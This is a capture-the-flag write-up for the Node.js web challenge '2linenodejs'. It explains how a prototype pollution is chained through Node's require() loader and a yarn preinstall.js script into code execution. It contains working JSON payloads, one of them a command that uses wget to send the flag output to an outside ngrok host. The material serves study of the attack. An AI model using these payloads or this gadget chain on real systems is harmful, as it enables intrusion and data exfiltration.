<h1>2linenodejs</h1>

<h2>Description</h2>

<p>Web | 13 solves</p>

<blockquote>
  <p>Sorry for my bad coding style :(</p>
  
  <p>Author: ginoah</p>
</blockquote>

<h2>Solution</h2>

<h3>Prototype Pollution</h3>

<p>Taking a look at the source, we see quite clearly that there is a prototype pollution here.</p>

<p>```javascript</p>

<h1>!/usr/local/bin/node</h1>

<p>process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () =&gt; {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(<code>JSON: ${json}, Object:</code>, require('./index')(obj, {}));
  }catch (e) {
    require('./usage')
  }finally{
    process.exit();
  }
});
```</p>

<p><code>JSON.parse</code> will allow the <code>__proto__</code> key, storing it as <code>['__proto__']</code> instead (which surprisingly works as a key when used here):</p>

<p><code>javascript
module.exports=(O,o) =&gt; (
    Object.entries(O).forEach(
        ([K,V])=&gt;Object.entries(V).forEach(
            ([k,v])=&gt;(o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
</code></p>

<p>Great! We have a prototype pollution - how do we leverage it to an RCE?</p>

<h3>require() Gadget</h3>

<p>After performing the pollution, we don't have much of a choice where we want to go. Either nothing happens and <code>process.exit()</code> is called, or we cause an exception and <code>require('./usage')</code> is called. Causing an exception is pretty simple and I actually stumbled upon it early on when testing simple payloads.</p>

<p>If one of the key-value pairs is a mapping to <code>null</code>, then <code>Object.entries(V)</code> will yield a <code>TypeError</code> since <code>null</code> cannot be converted to an <code>Object</code>.</p>

<p>```javascript
        ([K,V])=&gt;Object.entries(V).forEach(
                        ^</p>

<p>TypeError: Cannot convert undefined or null to object
```</p>

<p>If we look into the <code>internal/modules/cjs/loader.js</code>, we see that in the <code>trySelf</code> function, there is a <a href="https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L461">possible gadget</a>.</p>

<p>If <code>readPackageScope</code> returns <code>false</code>, then the destructuring assignment should leave <code>pkg</code> and <code>pkgPath</code> as <code>undefined</code>, since the right-hand side is <code>{}</code>. But if we pollute <code>__proto__.data</code> and <code>__proto__.path</code>, then we can control <code>pkg</code> and <code>pkgPath</code>.</p>

<p>```javascript
function trySelf(parentPath, request) {
  if (!parentPath) return false;</p>

<p>const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
  if (!pkg || pkg.exports === undefined) return false;
  if (typeof pkg.name !== 'string') return false;
```</p>

<p>But what is <code>pkg</code> and <code>pkgPath</code>? We could look at <code>readPackageScope</code> and find out that it calls&#x20;</p>

<p><a href="https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L308"><code>readPackage</code></a> to populate the result, and <code>readPackage</code> just reads the <code>package.json</code> file of a Node.js module.</p>

<p>```javascript
function readPackage(requestPath) {
  const jsonPath = path.resolve(requestPath, 'package.json');</p>

<p>const existing = packageJsonCache.get(jsonPath);
  if (existing !== undefined) return existing;</p>

<p>...
```</p>

<p>So <code>pkg</code> appears to just be an object containing the <a href="https://nodejs.org/api/packages.html#nodejs-packagejson-field-definitions"><code>package.json</code> fields</a> and <code>pkgPath</code> is the path to this package. Importantly, we see <code>pkg.exports</code> being used a lot in the subsequent code path, and this makes sence given the following explanation of <code>exports</code> in <code>package.json</code>:</p>

<blockquote>
  <p>The <code>"exports"</code> field allows defining the <a href="https://nodejs.org/api/packages.html#package-entry-points">entry points</a> of a package when imported by name loaded either via a <code>node_modules</code> lookup or a <a href="https://nodejs.org/api/packages.html#self-referencing-a-package-using-its-name">self-reference</a> to its own name.&#x20;</p>
</blockquote>

<p>With this knowledge, we can confirm that the following exploit allows us to load any JavaScript file.</p>

<p><code>json
{
    "__proto__": {
        "data": {
            "name": "./usage",
            "exports": {
                ".": "./some-file.js"
            }
        },
        "path": "/some/path/to/file",
    },
    "x": null
}
</code></p>

<h3>preinstall.js Gadget</h3>

<p>Initially doing a simple search for all JavaScript files in the container (<code>find / -name "*.js" 2&gt;/dev/null</code>), we can find <code>/opt/yarn-v1.22.19/preinstall.js</code>. Doing a bit of digging, we can find out that this script is added from <a href="https://github.com/yarnpkg/yarn/pull/8343">here</a>.</p>

<p>Immediately we see in this script that we have <code>child_process.execFileSync</code> being called, which looks promising.</p>

<p>```javascript
if (process.env.npm<em>config</em>global) {
    var cp = require('child_process');
    var fs = require('fs');
    var path = require('path');</p>

<pre><code>try {
    console.log(process.execPath, process.env.npm_execpath)
    var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
        encoding: 'utf8',
        stdio: ['inherit', 'inherit', 'inherit'],
    }).replace(/\n/g, '');
    process.exit()
</code></pre>

<p>```</p>

<p>First off, to reach this code path we could need to pollute <code>npm_config_global</code> to a truthy value.</p>

<p><code>process.execPath</code> is always <code>/usr/bin/node</code>, and we can't control it. But we could control <code>process.env.npm_execpath</code> since it is not set by default. Looking at the <a href="https://nodejs.org/api/cli.html">CLI documentation</a>, the <a href="https://nodejs.org/api/cli.html#-e---eval-script"><code>-e</code> or <code>--eval</code></a> option looks promising! This would basically allow us to run inline JavaScript.</p>

<p>One issue is that because the regex matches up to the first space character, our JSON cannot have any spaces.</p>

<p><code>javascript
const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
</code></p>

<p>To get around this, we use <code>${IFS}</code>. For instance, we could pollute <code>npm_execpath</code> to <code>--eval=require('child_process').execSync('sleep${IFS}5')</code>.</p>

<p>The final payload was using <code>wget</code> and command substitution to exfiltrate the <code>/readflag</code> output.</p>

<p><code>javascript
{
    "__proto__": {
        "data": {
            "name": "./usage",
            "exports": {
                ".": "./preinstall.js"
            }
        },
        "path": "./",
        "npm_config_global": 1,
        "npm_execpath": "--eval=require('child_process').execSync('wget${IFS}https://012c-49-245-33-142.ngrok.io/`/readflag`')"
    },
    "x": null
}
</code></p>

<p>This gives us the flag on our listening HTTP server.</p>

<p><code>http
GET /BALSN%7BPr0toTyP3_PoL1u7i0n_1s_so_Cooooooool%21%21%21%7D HTTP/1.1
Host: 012c-49-245-33-142.ngrok.io
User-Agent: Wget
X-Forwarded-For: 44.204.208.69
X-Forwarded-Proto: https
Accept-Encoding: gzip
</code></p>
